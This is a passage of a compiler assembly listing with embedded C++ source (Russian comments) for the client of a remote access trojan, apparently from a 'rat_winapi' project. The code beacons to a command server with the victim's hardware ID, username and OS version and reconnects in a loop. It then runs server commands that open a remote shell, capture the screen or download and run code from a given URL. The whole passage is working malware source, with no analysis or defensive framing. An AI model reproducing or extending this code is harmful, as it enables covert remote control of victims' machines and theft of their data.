  00207	ff d6		 call	 esi

; 197  : 		}
; 198  : 	}

  00209	e9 0b ff ff ff	 jmp	 $LN2@RUNSHELL
$LN23@RUNSHELL:

; 185  : 				{
; 186  : 					closesocket(shellsock);

  0020e	57		 push	 edi
  0020f	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__closesocket@4
$exit$37:

; 199  : exit:
; 200  : 	TerminateProcess(pInfo.hProcess, 0);

  00215	6a 00		 push	 0
  00217	ff 74 24 44	 push	 DWORD PTR _pInfo$[esp+4516]
  0021b	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__TerminateProcess@8

; 201  : 	return 0;
; 202  : }

  00221	5f		 pop	 edi
  00222	5e		 pop	 esi
  00223	5d		 pop	 ebp
  00224	33 c0		 xor	 eax, eax
  00226	5b		 pop	 ebx
  00227	81 c4 90 11 00
	00		 add	 esp, 4496		; 00001190H
  0022d	c2 04 00	 ret	 4
_RUNSHELL@4 ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
; File c:\users\kote\documents\github\rat_winapi\client\client\source.cpp
_TEXT	SEGMENT
_dle$1 = -2008						; size = 1000
_indata$2 = -1008					; size = 1004
_param$ = 8						; size = 4
_RecvThread@4 PROC

; 205  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 e4 f8	 and	 esp, -8			; fffffff8H
  00006	81 ec d8 07 00
	00		 sub	 esp, 2008		; 000007d8H
  0000c	53		 push	 ebx
  0000d	55		 push	 ebp
  0000e	bd ec 03 00 00	 mov	 ebp, 1004		; 000003ecH
  00013	56		 push	 esi
  00014	8b 35 00 00 00
	00		 mov	 esi, DWORD PTR __imp__CreateThread@24
  0001a	57		 push	 edi
  0001b	33 ff		 xor	 edi, edi
  0001d	8d 5d fc	 lea	 ebx, DWORD PTR [ebp-4]
$LL2@RecvThread:

; 206  : 	while (TRUE)
; 207  : 	{
; 208  : 		CMDiDATA indata; //создаем структуру отвечающую за протокол
; 209  : 		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 							  //recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0); //прием сообщения от cервера

  00020	55		 push	 ebp
  00021	8d 84 24 fc 03
	00 00		 lea	 eax, DWORD PTR _indata$2[esp+2028]
  00028	57		 push	 edi
  00029	50		 push	 eax
  0002a	e8 00 00 00 00	 call	 _memset
  0002f	83 c4 0c	 add	 esp, 12			; 0000000cH

; 210  : 		if (sizeof(CMDiDATA) == recv(Socket, (char*)&indata, sizeof(CMDiDATA), 0)) //прием сообщения от cервера

  00032	8d 84 24 f8 03
	00 00		 lea	 eax, DWORD PTR _indata$2[esp+2024]
  00039	57		 push	 edi
  0003a	55		 push	 ebp
  0003b	50		 push	 eax
  0003c	ff 35 00 00 00
	00		 push	 DWORD PTR _Socket
  00042	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__recv@16
  00048	3b c5		 cmp	 eax, ebp
  0004a	75 63		 jne	 SHORT $LN6@RecvThread

; 211  : 		{
; 212  : 			switch (indata.CMD)

  0004c	8b 84 24 f8 03
	00 00		 mov	 eax, DWORD PTR _indata$2[esp+2024]
  00053	83 e8 04	 sub	 eax, 4
  00056	74 16		 je	 SHORT $LN10@RecvThread
  00058	83 e8 01	 sub	 eax, 1
  0005b	74 1f		 je	 SHORT $LN8@RecvThread
  0005d	83 e8 01	 sub	 eax, 1
  00060	75 be		 jne	 SHORT $LL2@RecvThread

; 221  : 				}
; 222  : 
; 223  : 				case CMD_SHELL:
; 224  : 				{
; 225  : 					CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RUNSHELL, NULL, 0, 0);

  00062	57		 push	 edi
  00063	57		 push	 edi
  00064	57		 push	 edi
  00065	68 00 00 00 00	 push	 OFFSET _RUNSHELL@4
  0006a	57		 push	 edi
  0006b	57		 push	 edi
  0006c	ff d6		 call	 esi
$LN10@RecvThread:

; 226  : 				}
; 227  : 
; 228  : 				case CMD_SCREEN:
; 229  : 				{
; 230  : 					CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GETSCREEN, NULL, 0, 0);

  0006e	57		 push	 edi
  0006f	57		 push	 edi
  00070	57		 push	 edi
  00071	68 00 00 00 00	 push	 OFFSET _GETSCREEN@4
$LN19@RecvThread:
  00076	57		 push	 edi
  00077	57		 push	 edi
  00078	ff d6		 call	 esi

; 231  : 				}
; 232  : 				default:
; 233  : 					break;
; 234  : 			}
; 235  : 		}

  0007a	eb a4		 jmp	 SHORT $LL2@RecvThread
$LN8@RecvThread:

; 213  : 			{
; 214  : 				case CMD_LOADER://если indata.cmd == CMD_LOADER
; 215  : 				{
; 216  : 					DLE dle; //инициализируем структуру DLE
; 217  : 					memset(&dle, 0, sizeof(DLE)); //очищаем ее

  0007c	53		 push	 ebx
  0007d	8d 44 24 14	 lea	 eax, DWORD PTR _dle$1[esp+2028]
  00081	57		 push	 edi
  00082	50		 push	 eax
  00083	e8 00 00 00 00	 call	 _memset
  00088	83 c4 0c	 add	 esp, 12			; 0000000cH

; 218  : 					memcpy(&dle, indata.DATA, sizeof(indata.DATA)); //и копируем в нее indata.DATA

  0008b	8d 84 24 fc 03
	00 00		 lea	 eax, DWORD PTR _indata$2[esp+2028]
  00092	53		 push	 ebx
  00093	50		 push	 eax
  00094	8d 44 24 18	 lea	 eax, DWORD PTR _dle$1[esp+2032]
  00098	50		 push	 eax
  00099	e8 00 00 00 00	 call	 _memcpy
  0009e	83 c4 0c	 add	 esp, 12			; 0000000cH

; 219  : 					CreateThread(NULL, 0, DLEFUNC, (LPVOID)dle.URL, 0, 0);

  000a1	8d 44 24 10	 lea	 eax, DWORD PTR _dle$1[esp+2024]
  000a5	57		 push	 edi
  000a6	57		 push	 edi
  000a7	50		 push	 eax
  000a8	68 00 00 00 00	 push	 OFFSET _DLEFUNC@4

; 220  : 					break;

  000ad	eb c7		 jmp	 SHORT $LN19@RecvThread
$LN6@RecvThread:

; 236  : 		else {
; 237  : 			if (10054 == GetLastError())

  000af	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__GetLastError@0
  000b5	3d 46 27 00 00	 cmp	 eax, 10054		; 00002746H
  000ba	74 0c		 je	 SHORT $LN16@RecvThread

; 240  : 				return 0;
; 241  : 			}
; 242  : 			Sleep(1000);

  000bc	53		 push	 ebx
  000bd	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__Sleep@4

; 243  : 		}
; 244  : 	}

  000c3	e9 58 ff ff ff	 jmp	 $LL2@RecvThread
$LN16@RecvThread:

; 238  : 			{
; 239  : 				closesocket(Socket);

  000c8	ff 35 00 00 00
	00		 push	 DWORD PTR _Socket
  000ce	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__closesocket@4

; 245  : 	return 0;
; 246  : }

  000d4	5f		 pop	 edi
  000d5	33 c0		 xor	 eax, eax
  000d7	5e		 pop	 esi
  000d8	5d		 pop	 ebp
  000d9	5b		 pop	 ebx
  000da	8b e5		 mov	 esp, ebp
  000dc	5d		 pop	 ebp
  000dd	c2 04 00	 ret	 4
_RecvThread@4 ENDP
_TEXT	ENDS
; Function compile flags: /Ogspy
; File c:\users\kote\documents\github\rat_winapi\client\client\source.cpp
_TEXT	SEGMENT
_ServerAddr$ = -1728					; size = 16
_client$1 = -1712					; size = 304
_indata$2 = -1408					; size = 1004
_wsaData$ = -400					; size = 400
_hInstance$ = 8						; size = 4
_hPrevInstance$ = 12					; size = 4
_lpCmdLine$ = 16					; size = 4
_nShowCmd$ = 20						; size = 4
_WinMain@16 PROC

; 254  : {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 e4 f8	 and	 esp, -8			; fffffff8H
  00006	81 ec c0 06 00
	00		 sub	 esp, 1728		; 000006c0H
  0000c	53		 push	 ebx
  0000d	55		 push	 ebp
  0000e	56		 push	 esi
  0000f	57		 push	 edi

; 255  : 	HMODULE ntdll = LoadLibraryA("ntdll.dll");

  00010	68 00 00 00 00	 push	 OFFSET ??_C@_09FLKFJBLM@ntdll?4dll?$AA@
  00015	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__LoadLibraryA@4

; 256  : 	pRtlGetCompressionWorkSpaceSize = (fRtlGetCompressionWorkSpaceSize)\

  0001b	8b 35 00 00 00
	00		 mov	 esi, DWORD PTR __imp__GetProcAddress@8
  00021	8b f8		 mov	 edi, eax
  00023	68 00 00 00 00	 push	 OFFSET ??_C@_0BP@PEOALDAJ@RtlGetCompressionWorkSpaceSize?$AA@
  00028	57		 push	 edi
  00029	ff d6		 call	 esi

; 257  : 		GetProcAddress(ntdll, "RtlGetCompressionWorkSpaceSize");
; 258  : 	pRtlCompressBuffer = (fRtlCompressBuffer)\

  0002b	68 00 00 00 00	 push	 OFFSET ??_C@_0BC@EFLLFMHP@RtlCompressBuffer?$AA@
  00030	57		 push	 edi
  00031	ff d6		 call	 esi

; 259  : 		GetProcAddress(ntdll, "RtlCompressBuffer");
; 260  : 
; 261  : 	struct WSAData wsaData;
; 262  : 	SOCKADDR_IN ServerAddr;
; 263  : 	WORD DLLVersion = MAKEWORD(2, 2);
; 264  : 	WSAStartup(DLLVersion, &wsaData);

  00033	8d 84 24 40 05
	00 00		 lea	 eax, DWORD PTR _wsaData$[esp+1744]
  0003a	50		 push	 eax
  0003b	68 02 02 00 00	 push	 514			; 00000202H
  00040	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__WSAStartup@8
  00046	6a 02		 push	 2
  00048	33 f6		 xor	 esi, esi
  0004a	bb ec 03 00 00	 mov	 ebx, 1004		; 000003ecH
  0004f	5f		 pop	 edi
  00050	bd 30 01 00 00	 mov	 ebp, 304		; 00000130H
$start$7:

; 265  : 
; 266  : start:
; 267  : 	memset(&ServerAddr, 0, sizeof(ServerAddr));

  00055	6a 10		 push	 16			; 00000010H
  00057	8d 44 24 14	 lea	 eax, DWORD PTR _ServerAddr$[esp+1748]
  0005b	56		 push	 esi
  0005c	50		 push	 eax
  0005d	e8 00 00 00 00	 call	 _memset
  00062	83 c4 0c	 add	 esp, 12			; 0000000cH

; 268  : 	Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  00065	6a 06		 push	 6
  00067	6a 01		 push	 1
  00069	57		 push	 edi
  0006a	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__socket@12

; 269  : 	ServerAddr.sin_family = AF_INET;
; 270  : 	//задаем конект на локалхост к восьмидесятому порту
; 271  : 	ServerAddr.sin_port = htons(80);

  00070	6a 50		 push	 80			; 00000050H
  00072	a3 00 00 00 00	 mov	 DWORD PTR _Socket, eax
  00077	66 89 7c 24 14	 mov	 WORD PTR _ServerAddr$[esp+1748], di
  0007c	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__htons@4

; 272  : 	ServerAddr.sin_addr.s_addr = inet_addr(ADDRSERVER);

  00082	68 00 00 00 00	 push	 OFFSET ??_C@_0BA@PECNAFNM@127?4000?4000?4001?$AA@
  00087	66 89 44 24 16	 mov	 WORD PTR _ServerAddr$[esp+1750], ax
  0008c	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__inet_addr@4
  00092	89 44 24 14	 mov	 DWORD PTR _ServerAddr$[esp+1748], eax

; 273  : 	//подключаемся к серверу!!!
; 274  : 
; 275  : 	if (connect(Socket, (SOCKADDR*)&ServerAddr, sizeof(ServerAddr)) == 0)

  00096	8d 44 24 10	 lea	 eax, DWORD PTR _ServerAddr$[esp+1744]
  0009a	6a 10		 push	 16			; 00000010H
  0009c	50		 push	 eax
  0009d	ff 35 00 00 00
	00		 push	 DWORD PTR _Socket
  000a3	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__connect@12
  000a9	85 c0		 test	 eax, eax
  000ab	0f 85 ac 00 00
	00		 jne	 $LN2@WinMain

; 276  : 	{
; 277  : 		//если мы подключились то передаем хендшейк:)
; 278  : 		CMDiDATA indata; //создаем структуру отвечающую за протокол
; 279  : 		CLIENTS client; //создаем структуру отвечающую за инфу о клиенте
; 280  : 		memset(&indata, 0, sizeof(CMDiDATA)); //почистим 

  000b1	53		 push	 ebx
  000b2	8d 84 24 54 01
	00 00		 lea	 eax, DWORD PTR _indata$2[esp+1748]
  000b9	56		 push	 esi
  000ba	50		 push	 eax
  000bb	e8 00 00 00 00	 call	 _memset

; 281  : 		memset(&client, 0, sizeof(CLIENTS)); //почистим

  000c0	55		 push	 ebp
  000c1	8d 44 24 30	 lea	 eax, DWORD PTR _client$1[esp+1760]
  000c5	56		 push	 esi
  000c6	50		 push	 eax
  000c7	e8 00 00 00 00	 call	 _memset
  000cc	83 c4 18	 add	 esp, 24			; 00000018H

; 282  : 		memcpy(client.HWID, GetHwid(), sizeof(client.HWID));

  000cf	6a 64		 push	 100			; 00000064H
  000d1	e8 00 00 00 00	 call	 _GetHwid
  000d6	50		 push	 eax
  000d7	8d 84 24 f4 00
	00 00		 lea	 eax, DWORD PTR _client$1[esp+1956]
  000de	50		 push	 eax
  000df	e8 00 00 00 00	 call	 _memcpy
  000e4	83 c4 0c	 add	 esp, 12			; 0000000cH

; 283  : 		memcpy(client.USERNAME, GetUsername(), sizeof(client.USERNAME));

  000e7	6a 64		 push	 100			; 00000064H
  000e9	e8 00 00 00 00	 call	 _GetUsername
  000ee	50		 push	 eax
  000ef	8d 44 24 2c	 lea	 eax, DWORD PTR _client$1[esp+1756]
  000f3	50		 push	 eax
  000f4	e8 00 00 00 00	 call	 _memcpy
  000f9	83 c4 0c	 add	 esp, 12			; 0000000cH

; 284  : 		memcpy(client.OSVER, GetOS(), sizeof(client.OSVER));

  000fc	6a 64		 push	 100			; 00000064H
  000fe	e8 00 00 00 00	 call	 _GetOS
  00103	50		 push	 eax
  00104	8d 84 24 90 00
	00 00		 lea	 eax, DWORD PTR _client$1[esp+1856]
  0010b	50		 push	 eax
  0010c	e8 00 00 00 00	 call	 _memcpy

; 285  : 		indata.CMD = CMD_HADSHAKE;
; 286  : 		memcpy(indata.DATA, &client, sizeof(CLIENTS));

  00111	55		 push	 ebp
  00112	8d 44 24 30	 lea	 eax, DWORD PTR _client$1[esp+1760]
  00116	89 b4 24 60 01
	00 00		 mov	 DWORD PTR _indata$2[esp+1760], esi
  0011d	50		 push	 eax
  0011e	8d 84 24 68 01
	00 00		 lea	 eax, DWORD PTR _indata$2[esp+1768]
  00125	50		 push	 eax
  00126	e8 00 00 00 00	 call	 _memcpy
  0012b	83 c4 18	 add	 esp, 24			; 00000018H

; 287  : 		send(Socket, (char*)&indata, sizeof(CMDiDATA), 0);

  0012e	8d 84 24 50 01
	00 00		 lea	 eax, DWORD PTR _indata$2[esp+1744]
  00135	56		 push	 esi
  00136	53		 push	 ebx
  00137	50		 push	 eax
  00138	ff 35 00 00 00
	00		 push	 DWORD PTR _Socket
  0013e	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__send@16

; 288  : 		HANDLE RECV = CreateThread(NULL, 0, RecvThread, NULL, 0, 0); //создаем тред который будет бесконечно принимать сообщения от сервера

  00144	56		 push	 esi
  00145	56		 push	 esi
  00146	56		 push	 esi
  00147	68 00 00 00 00	 push	 OFFSET _RecvThread@4
  0014c	56		 push	 esi
  0014d	56		 push	 esi
  0014e	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__CreateThread@24

; 289  : 		WaitForSingleObject(RECV, INFINITE); //Бесконечно ожидаем пока этот тред работает...

  00154	6a ff		 push	 -1
  00156	50		 push	 eax
  00157	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__WaitForSingleObject@8
$LN2@WinMain:

; 290  : 	}
; 291  : 	Sleep(10000);

  0015d	68 10 27 00 00	 push	 10000			; 00002710H
  00162	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__Sleep@4

; 292  : 	goto start;

  00168	e9 e8 fe ff ff	 jmp	 $start$7
_WinMain@16 ENDP
_TEXT	ENDS
END
